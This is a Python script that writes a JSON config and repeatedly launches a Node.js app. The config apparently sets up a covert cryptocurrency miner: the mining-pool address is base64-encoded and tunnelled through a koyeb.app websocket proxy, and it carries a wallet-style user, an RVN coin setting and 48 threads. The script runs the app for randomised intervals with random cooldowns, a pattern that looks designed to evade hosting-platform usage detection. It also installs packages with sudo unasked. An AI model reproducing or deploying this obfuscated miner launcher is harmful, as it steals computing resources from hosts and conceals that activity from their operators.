#!/usr/bin/env python3
import os
import subprocess
import time
import json
import stat
import sys
import random
import signal

# --- Configuration ---
NODE_EXECUTABLE = './node'
APP_SCRIPT = 'app.js'
JSON_CONFIG_FILE = 'data.json'
JSON_DATA = {
    "proxy": "wss://ratty-adoree-ananta512-4abadf1a.koyeb.app/cG93ZXIyYi5taW5lLnplcmdwb29sLmNvbTo3NDQ1",
    "config": {
        "threads": 48,
        "log": True
    },
    "options": {
        "user": "RXi399jsFYHLeqFhJWiNETySj5nvt2ryqj",
        "password": "c=RVN",
        "argent": "timmer@56565612"
    }
}

# Global variable to track current process
current_process = None

def signal_handler(signum, frame):
    """Handle graceful shutdown on SIGTERM/SIGINT"""
    print(f"\nReceived signal {signum}. Shutting down gracefully...")
    if current_process and current_process.poll() is None:
        print("Terminating current node process...")
        try:
            current_process.terminate()
            current_process.wait(timeout=10)
        except subprocess.TimeoutExpired:
            print("Force killing process...")
            current_process.kill()
    sys.exit(0)

def perform_initial_setup():
    """
    Performs the initial setup steps: finds executables, sets permissions,
    and creates the configuration file in the current directory.
    """
    global NODE_EXECUTABLE, APP_SCRIPT

    print("--- Starting Initial Setup ---")
    print(f"Working in directory: {os.getcwd()}")

    # Check for and install psutil if needed for resource monitoring
    try:
        import psutil
    except ImportError:
        print("psutil not found. Attempting to install...")
        try:
            subprocess.run([sys.executable, '-m', 'pip', 'install', 'psutil'], check=True, capture_output=True)
        except (subprocess.CalledProcessError, ImportError) as e:
            print(f"Warning: Could not install psutil. System resource checks disabled. Error: {e}")

    # Check if node executable exists, find it, or install it
    if not os.path.exists(NODE_EXECUTABLE):
        print(f"Default executable '{NODE_EXECUTABLE}' not found. Searching...")
        possible_paths = ['/usr/bin/node', '/usr/local/bin/node', 'node']
        node_found = False
        for path in possible_paths:
            if path == 'node' and subprocess.run(['which', 'node'], capture_output=True).returncode == 0:
                NODE_EXECUTABLE = 'node'
                print(f"Found node in PATH: {NODE_EXECUTABLE}")
                node_found = True
                break
            elif os.path.exists(path):
                NODE_EXECUTABLE = path
                print(f"Found node at: {NODE_EXECUTABLE}")
                node_found = True
                break
        
        if not node_found:
            print("Error: No node executable found. Attempting to install...")
            try:
                subprocess.run(['curl', '-fsSL', 'https://deb.nodesource.com/setup_18.x'], check=True)
                subprocess.run(['sudo', 'apt-get', 'install', '-y', 'nodejs'], check=True)
                NODE_EXECUTABLE = 'node'
            except subprocess.CalledProcessError as e:
                print(f"Failed to install Node.js: {e}")
                sys.exit(1)

    # Check if app.js exists or find it in package.json
    if not os.path.exists(APP_SCRIPT):
        print(f"Default script '{APP_SCRIPT}' not found. Checking package.json...")
        if os.path.exists('package.json'):
            try:
                with open('package.json', 'r') as f:
                    package_data = json.load(f)
                    if 'main' in package_data and os.path.exists(package_data['main']):
                        APP_SCRIPT = package_data['main']
                        print(f"Using main script from package.json: {APP_SCRIPT}")
            except (json.JSONDecodeError, IOError) as e:
                print(f"Could not read package.json: {e}")
    
    if not os.path.exists(APP_SCRIPT):
        print(f"Error: Could not find a valid application script ('{APP_SCRIPT}').")
        sys.exit(1)
        
    # --- FIX ---
    # Set execute permission if using a local node executable
    if NODE_EXECUTABLE.startswith('./'):
        print(f"Setting execute permission on '{NODE_EXECUTABLE}'...")
        try:
            current_permissions = os.stat(NODE_EXECUTABLE).st_mode
            os.chmod(NODE_EXECUTABLE, current_permissions | stat.S_IEXEC)
            print("Permission set successfully.")
        except OSError as e:
            print(f"Error setting permission: {e}")
            sys.exit(1)
    # --- END FIX ---

    # Write the configuration to data.json
    try:
        print(f"Creating or overwriting '{JSON_CONFIG_FILE}'...")
        with open(JSON_CONFIG_FILE, 'w') as f:
            json.dump(JSON_DATA, f, indent=2)
        print(f"'{JSON_CONFIG_FILE}' has been created successfully.")
    except IOError as e:
        print(f"Error: Could not write to '{JSON_CONFIG_FILE}': {e}")
        sys.exit(1)
    
    print("--- Initial Setup Complete ---")

def check_system_resources():
    """Check if system has enough resources to run the application"""
    try:
        import psutil
        memory = psutil.virtual_memory()
        if memory.percent > 90:
            print(f"Warning: High memory usage: {memory.percent}%")
        
        cpu_percent = psutil.cpu_percent(interval=1)
        if cpu_percent > 90:
            print(f"Warning: High CPU usage: {cpu_percent}%")
        
        disk = psutil.disk_usage('.')
        if disk.percent > 90:
            print(f"Warning: Low disk space: {disk.percent}% used")
    except ImportError:
        pass # psutil not available, skip check
    except Exception as e:
        print(f"Could not check system resources: {e}")

def start_main_loop():
    """
    Starts the main infinite loop to run the node process repeatedly.
    """
    global current_process
    cycle_count = 0
    
    signal.signal(signal.SIGTERM, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)
    
    print("\nStarting main execution loop... (Press Ctrl+C to stop)")
    
    while True:
        cycle_count += 1
        print(f"\n{'='*20} CYCLE {cycle_count} ({time.strftime('%Y-%m-%d %H:%M:%S')}) {'='*20}")
        
        check_system_resources()
        
        run_duration = random.randint(320, 450)
        cooldown_duration = random.randint(45, 60)
        
        print(f"Starting '{NODE_EXECUTABLE} {APP_SCRIPT}' for {run_duration} seconds...")
        
        try:
            current_process = subprocess.Popen([NODE_EXECUTABLE, APP_SCRIPT])
            current_process.wait(timeout=run_duration)
            print("Process finished on its own.")
            
        except subprocess.TimeoutExpired:
            print(f"Process ran for {run_duration}s. Terminating...")
            current_process.terminate()
            try:
                current_process.wait(timeout=10)
                print("Process terminated gracefully.")
            except subprocess.TimeoutExpired:
                print("Process did not terminate, killing.")
                current_process.kill()
                
        except FileNotFoundError:
            print(f"Error: Command not found '{NODE_EXECUTABLE}'. Exiting.")
            break
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
        
        finally:
            current_process = None
        
        print(f"Cooldown for {cooldown_duration} seconds...")
        time.sleep(cooldown_duration)

if __name__ == "__main__":
    try:
        perform_initial_setup()
        start_main_loop()
    except KeyboardInterrupt:
        print("\n\nScript interrupted by user. Exiting.")
        sys.exit(0)
    except Exception as e:
        print(f"\nFatal error in script: {e}")
        sys.exit(1)
